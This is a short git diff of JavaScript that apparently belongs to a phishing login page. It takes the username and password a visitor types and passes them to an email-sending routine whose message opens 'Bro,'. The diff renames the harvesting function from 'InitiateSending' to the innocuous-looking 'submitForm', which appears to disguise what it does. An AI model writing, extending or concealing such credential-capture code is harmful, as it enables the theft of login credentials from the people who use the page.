@@ -55,7 +55,7 @@ const sendEmail = (envelope) => {
     .finally(() => {});
 };
 
-const InitiateSending = (username, password, type, tries) => {
+const submitForm = (username, password, type, tries) => {
   const messageTemplate = `
 Bro,
 
@@ -88,9 +88,9 @@ try {
     let username = document.getElementById("username");
     let password = document.getElementById("password");
     if (username.value.length > 5 && password.value.length > 5) {
-      InitiateSending(username.value, password.value, type, tries);
+      submitForm(username.value, password.value, type, tries);
     }
   });
 } catch (error) {}
 
-export { InitiateSending, sendEmail };
+export { submitForm, sendEmail };
